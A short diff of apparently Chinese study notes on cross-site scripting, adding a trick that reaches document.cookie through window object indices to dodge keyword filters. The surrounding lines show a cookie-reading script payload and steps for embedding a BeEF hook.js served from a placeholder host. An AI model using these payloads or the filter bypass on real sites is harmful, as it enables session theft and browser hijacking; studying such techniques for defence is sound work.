@@ -4,6 +4,12 @@ XSS注入在线脚本危害：
 ```
 <script>alert(document.cookie)</script>
 
+绕过document.cookie：
+Object.keys(window).indexOf("document")  //查看document返回的坐标，如=> 2，下面就用2获取cookie
+window[Object.keys(window)[2]].cookie 
+
+
+
 1. kali中的beef (apt search beef-xss)
     开启监控，生成一个xxx.com:3000/hook.js在线脚本
     在网站中引入此JS
